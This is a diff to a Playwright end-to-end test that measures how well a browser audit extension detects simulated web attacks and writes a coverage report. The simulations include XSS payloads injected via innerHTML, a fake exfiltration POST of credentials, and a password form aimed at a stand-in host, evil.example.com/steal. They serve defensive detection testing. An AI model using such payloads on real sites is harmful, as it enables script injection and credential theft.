@@ -1,15 +1,15 @@
 /**
- * Battacker-Audit Integration E2E Test
+ * Audit Extension Detection Coverage E2E Test
  *
- * Tests that Audit extension detects attacks simulated by Battacker.
- * Both extensions are loaded via Playwright's persistent context.
+ * Tests coverage of Audit extension's detection capabilities.
+ * Measures which detection types are properly triggered by attack simulations.
  */
 
 import { test, expect } from "@playwright/test";
 import { chromium, type BrowserContext, type Page } from "playwright";
 import { resolve, dirname } from "node:path";
 import { fileURLToPath } from "node:url";
-import { existsSync } from "node:fs";
+import { existsSync, writeFileSync } from "node:fs";
 import { createServer, type Server } from "node:http";
 import { readFileSync } from "node:fs";
 
@@ -18,27 +18,108 @@ const __dirname = dirname(fileURLToPath(import.meta.url));
 const AUDIT_EXTENSION_PATH = resolve(__dirname, "../../audit-extension/dist/chrome-mv3");
 const BATTACKER_EXTENSION_PATH = resolve(__dirname, "../../battacker-extension/dist/chrome-mv3");
 const TEST_PAGE_PATH = resolve(__dirname, "../fixtures/test-page.html");
+const COVERAGE_REPORT_PATH = resolve(__dirname, "../coverage-report.json");
 
-// Event types that Audit extension detects
-type AuditEventType =
-  | "tracking_beacon_detected"
-  | "data_exfiltration_detected"
-  | "xss_detected"
-  | "cookie_access_detected"
-  | "suspicious_download_detected"
-  | "dom_scraping_detected"
-  | "clipboard_hijack_detected"
-  | "credential_theft_risk"
-  | "supply_chain_risk"
-  | "login_detected"
-  | "typosquat_detected"
-  | "cookie_set";
+// ============================================================================
+// Audit Detection Specification
+// These are ALL detection types that Audit extension supports (api-hooks.js)
+// ============================================================================
+
+const AUDIT_DETECTION_SPEC = {
+  tracking_beacon_detected: {
+    description: "Tracking beacon via sendBeacon or small POST with tracking patterns",
+    source: "ai-hooks.js",
+    priority: "high",
+    implemented: true,
+  },
+  data_exfiltration_detected: {
+    description: "Large POST or sensitive data patterns (email, password, API key, etc.)",
+    source: "ai-hooks.js",
+    priority: "critical",
+    implemented: true,
+  },
+  xss_detected: {
+    description: "XSS payload injection via innerHTML (script, onerror, javascript:)",
+    source: "ai-hooks.js",
+    priority: "critical",
+    implemented: true,
+  },
+  cookie_access_detected: {
+    description: "Frequent document.cookie access",
+    source: "ai-hooks.js",
+    priority: "medium",
+    implemented: true,
+  },
+  dom_scraping_detected: {
+    description: "Mass querySelectorAll calls (>50 in 5 seconds)",
+    source: "ai-hooks.js",
+    priority: "medium",
+    implemented: true,
+  },
+  clipboard_hijack_detected: {
+    description: "Crypto wallet address written to clipboard",
+    source: "ai-hooks.js",
+    priority: "high",
+    implemented: true,
+  },
+  suspicious_download_detected: {
+    description: "Blob/data URL download or dangerous file extensions",
+    source: "ai-hooks.js",
+    priority: "high",
+    implemented: true,
+  },
+  supply_chain_risk: {
+    description: "External script without SRI (Subresource Integrity)",
+    source: "api-hooks.js",
+    priority: "high",
+    // NOTE: api-hooks.js is NOT injected as content script - only ai-hooks.js is
+    // This detection exists in api-hooks.js but the file is not loaded into pages
+    implemented: false,
+    gap: "api-hooks.js not injected as content script",
+  },
+  credential_theft_risk: {
+    description: "Form with password field submitted to external/insecure target",
+    source: "api-hooks.js",
+    priority: "critical",
+    // NOTE: api-hooks.js is NOT injected as content script - only ai-hooks.js is
+    // This detection exists in api-hooks.js but the file is not loaded into pages
+    implemented: false,
+    gap: "api-hooks.js not injected as content script",
+  },
+} as const;
+
+type AuditDetectionType = keyof typeof AUDIT_DETECTION_SPEC;
 
 interface AuditEvent {
-  type: AuditEventType;
+  type: string;
   domain: string;
   timestamp: number;
   details?: Record<string, unknown>;
+}
+
+interface DetectionTestResult {
+  type: AuditDetectionType;
+  tested: boolean;
+  detected: boolean;
+  eventCount: number;
+  implemented: boolean;
+  gap?: string;
+  error?: string;
+}
+
+interface CoverageReport {
+  timestamp: string;
+  summary: {
+    total: number;
+    implemented: number;
+    notImplemented: number;
+    tested: number;
+    detected: number;
+    coveragePercent: number;
+    successRate: number;
+  };
+  results: DetectionTestResult[];
+  gaps: { type: string; reason: string }[];
 }
 
 interface TestContext {
@@ -49,15 +130,23 @@ interface TestContext {
   serverPort: number;
 }
 
+// ============================================================================
+// Test Infrastructure
+// ============================================================================
+
 function startTestServer(): Promise<{ server: Server; port: number }> {
   return new Promise((resolve) => {
+    const testPageContent = readFileSync(TEST_PAGE_PATH, "utf-8");
+
     const server = createServer((req, res) => {
       if (req.url === "/" || req.url === "/test-page.html") {
-        const content = readFileSync(TEST_PAGE_PATH, "utf-8");
         res.writeHead(200, { "Content-Type": "text/html" });
-        res.end(content);
+        res.end(testPageContent);
+      } else if (req.url === "/external-script.js") {
+        // External script without SRI for supply chain risk test
+        res.writeHead(200, { "Content-Type": "application/javascript" });
+        res.end("console.log('external script loaded');");
       } else {
-        // Mock endpoints for attack simulations
         res.writeHead(200, { "Content-Type": "application/json" });
         res.end(JSON.stringify({ ok: true }));
       }
@@ -72,19 +161,15 @@ function startTestServer(): Promise<{ server: Server; port: number }> {
 }
 
 async function setupBrowserWithExtensions(): Promise<TestContext> {
-  // Verify extension builds exist
   if (!existsSync(AUDIT_EXTENSION_PATH)) {
-    throw new Error(`Audit extension not found at ${AUDIT_EXTENSION_PATH}. Run: pnpm --filter @pleno-audit/audit-extension build`);
+    throw new Error(`Audit extension not found. Run: pnpm --filter @pleno-audit/audit-extension build`);
   }
   if (!existsSync(BATTACKER_EXTENSION_PATH)) {
-    throw new Error(`Battacker extension not found at ${BATTACKER_EXTENSION_PATH}. Run: pnpm --filter @pleno-audit/battacker-extension build`);
+    throw new Error(`Battacker extension not found. Run: pnpm --filter @pleno-audit/battacker-extension build`);
   }
 
-  // Start test server
   const { server, port } = await startTestServer();
 
-  // Chrome extensions require the new headless mode (--headless=new)
-  // Traditional headless mode doesn't support extensions
   const context = await chromium.launchPersistentContext("", {
     headless: false,
     args: [
@@ -96,58 +181,36 @@ async function setupBrowserWithExtensions(): Promise<TestContext> {
     ],
   });
 
-  // Wait for extensions to initialize and retry service worker detection
   let auditExtensionId: string | null = null;
-  const maxAttempts = 15;
-
-  for (let attempt = 0; attempt < maxAttempts; attempt++) {
+  for (let attempt = 0; attempt < 15; attempt++) {
     await new Promise((r) => setTimeout(r, 500));
-
     const serviceWorkers = context.serviceWorkers();
-    if (attempt === 0 || attempt % 5 === 0) {
-      console.log(`Attempt ${attempt + 1}: Found ${serviceWorkers.length} service workers`);
-      for (const sw of serviceWorkers) {
-        console.log(`  - ${sw.url()}`);
-      }
-    }
-
-    // Find extension service workers
     for (const sw of serviceWorkers) {
-      const url = sw.url();
-      if (url.includes("background")) {
-        const id = new URL(url).host;
-        if (!auditExtensionId) {
-          auditExtensionId = id;
-          console.log(`Found extension: ${auditExtensionId}`);
-        }
+      if (sw.url().includes("background")) {
+        auditExtensionId = new URL(sw.url()).host;
+        break;
       }
     }
-
-    if (auditExtensionId) {
-      break;
-    }
+    if (auditExtensionId) break;
   }
 
   if (!auditExtensionId) {
     await context.close();
     server.close();
-    throw new Error("Extension service worker not found after multiple attempts");
+    throw new Error("Extension service worker not found");
   }
 
   const page = await context.newPage();
-
   return { context, page, auditExtensionId, server, serverPort: port };
 }
 
 async function getAuditEvents(context: BrowserContext, extensionId: string): Promise<AuditEvent[]> {
   const backgroundPage = await context.newPage();
-
   try {
     await backgroundPage.goto(`chrome-extension://${extensionId}/dashboard.html`, {
       waitUntil: "networkidle",
       timeout: 15000,
     });
-
     await backgroundPage.waitForTimeout(2000);
 
     const events = await backgroundPage.evaluate(async () => {
@@ -157,198 +220,380 @@ async function getAuditEvents(context: BrowserContext, extensionId: string): Pro
           data: { limit: 1000 },
         });
         return response?.events || [];
-      } catch (e) {
-        console.error("Failed to get events:", e);
+      } catch {
         return [];
       }
     });
-
     return events as AuditEvent[];
-  } catch (e) {
-    console.log("Failed to get events from dashboard:", e);
-    return [];
   } finally {
     await backgroundPage.close();
   }
 }
 
-test.describe("Battacker-Audit Integration E2E Suite", () => {
+// ============================================================================
+// Attack Simulations for Each Detection Type
+// ============================================================================
+
+async function simulateTrackingBeacon(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    // Use fetch with POST to trigger tracking beacon detection
+    // sendBeacon may not work reliably in headless mode
+    fetch("/tracking/beacon", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        event: "pageview",
+        session: "test-session",
+        user_id: "user-456",
+        visitor: "visitor-123",
+      }),
+    }).catch(() => {});
+
+    // Also try sendBeacon as backup
+    if (navigator.sendBeacon) {
+      navigator.sendBeacon("/analytics/collect", JSON.stringify({
+        event: "click",
+        action: "button_click",
+        user_id: "user-789",
+      }));
+    }
+  });
+}
+
+async function simulateDataExfiltration(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    fetch("/api/collect", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: "victim@example.com",
+        password: "supersecret123",
+        api_key: "sk-1234567890abcdef1234567890abcdef",
+      }),
+    }).catch(() => {});
+  });
+}
+
+async function simulateXSS(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    const div = document.createElement("div");
+    div.innerHTML = '<script>alert("xss")</script>';
+    document.body.appendChild(div);
+
+    const div2 = document.createElement("div");
+    div2.innerHTML = '<img src=x onerror="alert(1)">';
+    document.body.appendChild(div2);
+  });
+}
+
+async function simulateCookieAccess(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    document.cookie = "test_session=abc123; path=/";
+    for (let i = 0; i < 10; i++) {
+      const _ = document.cookie;
+    }
+  });
+}
+
+async function simulateDOMScraping(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    for (let i = 0; i < 60; i++) {
+      document.querySelectorAll("*");
+      document.querySelectorAll("input");
+    }
+  });
+}
+
+async function simulateClipboardHijack(page: Page): Promise<void> {
+  await page.evaluate(async () => {
+    // Bitcoin address pattern
+    const bitcoinAddress = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";
+    try {
+      await navigator.clipboard.writeText(bitcoinAddress);
+    } catch {
+      // Clipboard API may be blocked in headless
+    }
+  });
+}
+
+async function simulateSuspiciousDownload(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    // Create blob download
+    const blob = new Blob(["malicious content"], { type: "application/octet-stream" });
+    const url = URL.createObjectURL(blob);
+
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = "malware.exe";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  });
+}
+
+async function simulateSupplyChainRisk(page: Page, _serverPort: number): Promise<void> {
+  await page.evaluate(() => {
+    // Add external CDN script without integrity attribute
+    // Must be from a different hostname to trigger detection
+    // IMPORTANT: MutationObserver watches document.body, not document.head
+    const script = document.createElement("script");
+    script.src = "https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js";
+    // No integrity attribute = supply chain risk for CDN resources
+    document.body.appendChild(script);
+
+    // Also add another external script for redundancy
+    const script2 = document.createElement("script");
+    script2.src = "https://unpkg.com/react@18/umd/react.production.min.js";
+    document.body.appendChild(script2);
+
+    // Add external stylesheet without SRI
+    const link = document.createElement("link");
+    link.rel = "stylesheet";
+    link.href = "https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css";
+    document.body.appendChild(link);
+  });
+}
+
+async function simulateCredentialTheft(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    // Create form with password field targeting external domain
+    const form = document.createElement("form");
+    form.action = "https://evil.example.com/steal";
+    form.method = "POST";
+    form.id = "credential-theft-test-form";
+
+    const passwordInput = document.createElement("input");
+    passwordInput.type = "password";
+    passwordInput.name = "password";
+    passwordInput.value = "secret123";
+    form.appendChild(passwordInput);
+
+    const emailInput = document.createElement("input");
+    emailInput.type = "email";
+    emailInput.name = "email";
+    emailInput.value = "victim@example.com";
+    form.appendChild(emailInput);
+
+    // Add hidden submit button
+    const submitBtn = document.createElement("button");
+    submitBtn.type = "submit";
+    submitBtn.style.display = "none";
+    form.appendChild(submitBtn);
+
+    document.body.appendChild(form);
+
+    // Dispatch submit event with proper bubbling to reach document listener
+    const submitEvent = new Event("submit", {
+      bubbles: true,
+      cancelable: true,
+    });
+    // Prevent actual navigation
+    form.addEventListener("submit", (e) => e.preventDefault(), { once: true });
+    form.dispatchEvent(submitEvent);
+
+    // Also create another form targeting insecure HTTP
+    const form2 = document.createElement("form");
+    form2.action = "http://insecure.example.com/login";
+    form2.method = "POST";
+
+    const pwdInput2 = document.createElement("input");
+    pwdInput2.type = "password";
+    pwdInput2.name = "pwd";
+    pwdInput2.value = "pass456";
+    form2.appendChild(pwdInput2);
+
+    document.body.appendChild(form2);
+    form2.addEventListener("submit", (e) => e.preventDefault(), { once: true });
+    form2.dispatchEvent(new Event("submit", { bubbles: true, cancelable: true }));
+  });
+}
+
+// ============================================================================
+// Detection Test Runner
+// ============================================================================
+
+const DETECTION_SIMULATORS: Record<AuditDetectionType, (page: Page, serverPort: number) => Promise<void>> = {
+  tracking_beacon_detected: (page) => simulateTrackingBeacon(page),
+  data_exfiltration_detected: (page) => simulateDataExfiltration(page),
+  xss_detected: (page) => simulateXSS(page),
+  cookie_access_detected: (page) => simulateCookieAccess(page),
+  dom_scraping_detected: (page) => simulateDOMScraping(page),
+  clipboard_hijack_detected: (page) => simulateClipboardHijack(page),
+  suspicious_download_detected: (page) => simulateSuspiciousDownload(page),
+  supply_chain_risk: (page, port) => simulateSupplyChainRisk(page, port),
+  credential_theft_risk: (page) => simulateCredentialTheft(page),
+};
+
+// ============================================================================
+// Tests
+// ============================================================================
+
+test.describe("Audit Detection Coverage", () => {
   let ctx: TestContext;
+  const testResults: DetectionTestResult[] = [];
 
   test.beforeAll(async () => {
     ctx = await setupBrowserWithExtensions();
   });
 
   test.afterAll(async () => {
-    if (ctx?.context) {
-      await ctx.context.close();
+    // Generate coverage report
+    const implementedResults = testResults.filter((r) => r.implemented);
+    const notImplementedResults = testResults.filter((r) => !r.implemented);
+    const detectedTypes = new Set(implementedResults.filter((r) => r.detected).map((r) => r.type));
+    const testedTypes = new Set(implementedResults.filter((r) => r.tested).map((r) => r.type));
+
+    // Collect gaps
+    const gaps = notImplementedResults
+      .filter((r) => r.gap)
+      .map((r) => ({ type: r.type, reason: r.gap! }));
+
+    const report: CoverageReport = {
+      timestamp: new Date().toISOString(),
+      summary: {
+        total: Object.keys(AUDIT_DETECTION_SPEC).length,
+        implemented: implementedResults.length,
+        notImplemented: notImplementedResults.length,
+        tested: testedTypes.size,
+        detected: detectedTypes.size,
+        coveragePercent: testedTypes.size > 0 ? Math.round((detectedTypes.size / testedTypes.size) * 100) : 0,
+        successRate: testedTypes.size > 0 ? Math.round((detectedTypes.size / testedTypes.size) * 100) : 0,
+      },
+      results: testResults,
+      gaps,
+    };
+
+    // Output coverage report
+    console.log("\n" + "=".repeat(60));
+    console.log("AUDIT DETECTION COVERAGE REPORT");
+    console.log("=".repeat(60));
+    console.log(`\nTimestamp: ${report.timestamp}`);
+    console.log(`\nSUMMARY:`);
+    console.log(`  Total Detection Types:  ${report.summary.total}`);
+    console.log(`  Implemented:            ${report.summary.implemented}`);
+    console.log(`  Not Implemented (gaps): ${report.summary.notImplemented}`);
+    console.log(`  Tested:                 ${report.summary.tested}`);
+    console.log(`  Successfully Detected:  ${report.summary.detected}`);
+    console.log(`  Coverage (impl only):   ${report.summary.coveragePercent}%`);
+
+    console.log(`\nDETAILED RESULTS:`);
+    console.log("-".repeat(60));
+
+    for (const type of Object.keys(AUDIT_DETECTION_SPEC) as AuditDetectionType[]) {
+      const result = testResults.find((r) => r.type === type);
+      const spec = AUDIT_DETECTION_SPEC[type];
+      const isImplemented = "implemented" in spec ? spec.implemented : true;
+
+      let status: string;
+      if (!isImplemented) {
+        status = "🔸 GAP ";
+      } else if (result?.detected) {
+        status = "✅ PASS";
+      } else if (result?.tested) {
+        status = "❌ FAIL";
+      } else {
+        status = "⚠️  SKIP";
+      }
+
+      const count = result?.eventCount ?? 0;
+      console.log(`  ${status} ${type}`);
+      console.log(`         Priority: ${spec.priority} | Events: ${count} | Source: ${spec.source}`);
+      if (result?.gap) {
+        console.log(`         Gap: ${result.gap}`);
+      }
+      if (result?.error && isImplemented) {
+        console.log(`         Error: ${result.error}`);
+      }
     }
-    if (ctx?.server) {
-      ctx.server.close();
+
+    if (gaps.length > 0) {
+      console.log(`\nIDENTIFIED GAPS:`);
+      console.log("-".repeat(60));
+      for (const gap of gaps) {
+        console.log(`  • ${gap.type}: ${gap.reason}`);
+      }
     }
+
+    console.log("\n" + "=".repeat(60));
+
+    // Save report to file
+    writeFileSync(COVERAGE_REPORT_PATH, JSON.stringify(report, null, 2));
+    console.log(`\nReport saved to: ${COVERAGE_REPORT_PATH}`);
+
+    // Cleanup
+    if (ctx?.context) await ctx.context.close();
+    if (ctx?.server) ctx.server.close();
   });
 
-  test("should detect all attack types when simulated", async () => {
-    const testPageUrl = `http://127.0.0.1:${ctx.serverPort}/test-page.html`;
+  // Generate test for each detection type
+  for (const [type, spec] of Object.entries(AUDIT_DETECTION_SPEC)) {
+    const detectionType = type as AuditDetectionType;
+    const isImplemented = "implemented" in spec ? spec.implemented : true;
+    const gapReason = "gap" in spec ? (spec as { gap: string }).gap : undefined;
 
-    // Navigate to test page
-    await ctx.page.goto(testPageUrl, { waitUntil: "domcontentloaded" });
+    test(`should detect: ${detectionType}`, async () => {
+      const testPageUrl = `http://127.0.0.1:${ctx.serverPort}/test-page.html`;
+      await ctx.page.goto(testPageUrl, { waitUntil: "domcontentloaded" });
+      await ctx.page.waitForTimeout(1000);
 
-    // Wait for extensions to inject their content scripts
-    await ctx.page.waitForTimeout(2000);
+      const result: DetectionTestResult = {
+        type: detectionType,
+        tested: true,
+        detected: false,
+        eventCount: 0,
+        implemented: isImplemented,
+        gap: gapReason,
+      };
 
-    // Run all attack simulations from the test page
-    await ctx.page.evaluate(() => {
-      // @ts-expect-error global function from test-page.html
-      if (typeof window.runAllTests === "function") {
-        // @ts-expect-error global function
-        window.runAllTests();
+      try {
+        // Run simulation
+        const simulator = DETECTION_SIMULATORS[detectionType];
+        await simulator(ctx.page, ctx.serverPort);
+
+        // Wait for event processing
+        await ctx.page.waitForTimeout(3000);
+
+        // Get events and check for detection
+        const events = await getAuditEvents(ctx.context, ctx.auditExtensionId);
+        const matchingEvents = events.filter((e) => e.type === detectionType);
+
+        result.eventCount = matchingEvents.length;
+        result.detected = matchingEvents.length > 0;
+
+        // Only assert for implemented detections
+        if (isImplemented) {
+          expect(
+            matchingEvents.length,
+            `Expected ${detectionType} to be detected. Priority: ${spec.priority}`
+          ).toBeGreaterThan(0);
+        } else {
+          // For non-implemented detections, just log and continue
+          console.log(`[GAP] ${detectionType}: ${gapReason}`);
+        }
+      } catch (error) {
+        result.error = error instanceof Error ? error.message : String(error);
+        // Only throw for implemented detections
+        if (isImplemented) {
+          throw error;
+        }
+      } finally {
+        testResults.push(result);
       }
     });
-
-    // Wait for all events to be processed
-    await ctx.page.waitForTimeout(5000);
-
-    // Get all detected events
-    const events = await getAuditEvents(ctx.context, ctx.auditExtensionId);
-
-    console.log("\n=== Audit Event Detection Results ===");
-    console.log(`Total events detected: ${events.length}`);
-
-    // Group events by type
-    const eventsByType = events.reduce((acc, e) => {
-      acc[e.type] = (acc[e.type] || 0) + 1;
-      return acc;
-    }, {} as Record<string, number>);
-
-    console.log("\nEvents by type:");
-    for (const [type, count] of Object.entries(eventsByType)) {
-      console.log(`  - ${type}: ${count}`);
-    }
-
-    // Verify security events are detected
-    expect(events.length, "Should detect at least some events").toBeGreaterThan(0);
-
-    // Check for specific attack detection types
-    const securityEventTypes: AuditEventType[] = [
-      "tracking_beacon_detected",
-      "data_exfiltration_detected",
-      "xss_detected",
-      "cookie_access_detected",
-      "dom_scraping_detected",
-    ];
-
-    const detectedTypes = new Set(events.map((e) => e.type));
-    const missingTypes = securityEventTypes.filter((t) => !detectedTypes.has(t));
-
-    if (missingTypes.length > 0) {
-      console.log(`\nMissing event types: ${missingTypes.join(", ")}`);
-    }
-
-    // At least 3 different security event types should be detected
-    const securityEventsDetected = securityEventTypes.filter((t) => detectedTypes.has(t));
-    expect(
-      securityEventsDetected.length,
-      `Should detect multiple security event types. Found: ${securityEventsDetected.join(", ")}`
-    ).toBeGreaterThanOrEqual(3);
-  });
-
-  test("should detect tracking beacons", async () => {
-    const testPageUrl = `http://127.0.0.1:${ctx.serverPort}/test-page.html`;
-    await ctx.page.goto(testPageUrl, { waitUntil: "domcontentloaded" });
-    await ctx.page.waitForTimeout(1000);
-
-    // Simulate beacon attack
-    await ctx.page.evaluate(() => {
-      navigator.sendBeacon("/tracking/beacon", JSON.stringify({
-        event: "pageview",
-        session: "test-session-" + Date.now(),
-        user_id: "user-456",
-      }));
-    });
-
-    await ctx.page.waitForTimeout(3000);
-
-    const events = await getAuditEvents(ctx.context, ctx.auditExtensionId);
-    const beaconEvents = events.filter((e) => e.type === "tracking_beacon_detected");
-
-    console.log(`Beacon events detected: ${beaconEvents.length}`);
-    expect(beaconEvents.length).toBeGreaterThan(0);
-  });
-
-  test("should detect data exfiltration attempts", async () => {
-    const testPageUrl = `http://127.0.0.1:${ctx.serverPort}/test-page.html`;
-    await ctx.page.goto(testPageUrl, { waitUntil: "domcontentloaded" });
-    await ctx.page.waitForTimeout(1000);
-
-    // Simulate data exfiltration
-    await ctx.page.evaluate(() => {
-      fetch("/api/collect", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email: "victim@example.com",
-          password: "supersecret123",
-          api_key: "sk-1234567890abcdef1234567890abcdef",
-        }),
-      }).catch(() => {});
-    });
-
-    await ctx.page.waitForTimeout(3000);
-
-    const events = await getAuditEvents(ctx.context, ctx.auditExtensionId);
-    const exfilEvents = events.filter((e) => e.type === "data_exfiltration_detected");
-
-    console.log(`Data exfiltration events detected: ${exfilEvents.length}`);
-    expect(exfilEvents.length).toBeGreaterThan(0);
-  });
-
-  test("should detect XSS payload injection", async () => {
-    const testPageUrl = `http://127.0.0.1:${ctx.serverPort}/test-page.html`;
-    await ctx.page.goto(testPageUrl, { waitUntil: "domcontentloaded" });
-    await ctx.page.waitForTimeout(1000);
-
-    // Simulate XSS attacks
-    await ctx.page.evaluate(() => {
-      const div = document.createElement("div");
-      div.innerHTML = '<script>alert("xss")</script>';
-      document.body.appendChild(div);
-
-      const div2 = document.createElement("div");
-      div2.innerHTML = '<img src=x onerror="alert(1)">';
-      document.body.appendChild(div2);
-    });
-
-    await ctx.page.waitForTimeout(3000);
-
-    const events = await getAuditEvents(ctx.context, ctx.auditExtensionId);
-    const xssEvents = events.filter((e) => e.type === "xss_detected");
-
-    console.log(`XSS events detected: ${xssEvents.length}`);
-    expect(xssEvents.length).toBeGreaterThan(0);
-  });
+  }
 });
 
-test.describe("Extension Loading Verification", () => {
+test.describe("Extension Loading", () => {
   test("both extensions should load successfully", async () => {
     const ctx = await setupBrowserWithExtensions();
-
     try {
       const serviceWorkers = ctx.context.serviceWorkers();
-
-      console.log("Loaded service workers:");
-      for (const sw of serviceWorkers) {
-        console.log(`  - ${sw.url()}`);
-      }
-
-      // Should have at least 2 service workers
       expect(serviceWorkers.length).toBeGreaterThanOrEqual(2);
 
-      // Navigate to test page
       await ctx.page.goto(`http://127.0.0.1:${ctx.serverPort}/test-page.html`);
       await ctx.page.waitForTimeout(2000);
 
-      // Verify page loaded correctly
       const title = await ctx.page.title();
       expect(title).toContain("Battacker-Audit");
     } finally {
